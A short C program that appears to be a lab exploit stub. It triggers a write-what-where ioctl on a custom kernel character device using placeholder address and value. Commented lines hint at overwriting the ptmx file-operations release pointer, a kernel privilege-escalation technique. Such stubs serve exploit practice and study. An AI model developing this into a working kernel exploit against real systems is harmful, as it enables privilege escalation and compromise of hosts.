#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include "chardev.h"

#define DEVICE_FILE_NAME "/dev/chardev0"
unsigned long *ptmx_fops_release;

int main()
{
    int fd;
    int ret_val;
    unsigned long *ptmx_fops;
    struct ioctl_www_arg arg;

    fd = open(DEVICE_FILE_NAME, 0);
    if (fd < 0) {
        printf("Can't open device file: %s\n", DEVICE_FILE_NAME);
        exit(1);
    }

    //ptmx_fops_release = 0x4141414141414141;


    //arg.ptr = ptmx_fops_release;
    arg.ptr = 0x4141414141414141;
    arg.value = 0x4242424242424242;

    ret_val = ioctl(fd, IOCTL_WWW, &arg);
    if (ret_val < 0) {
        printf("ioctl failed: %d\n", ret_val);
        exit(1);
    }

    close(fd);
}
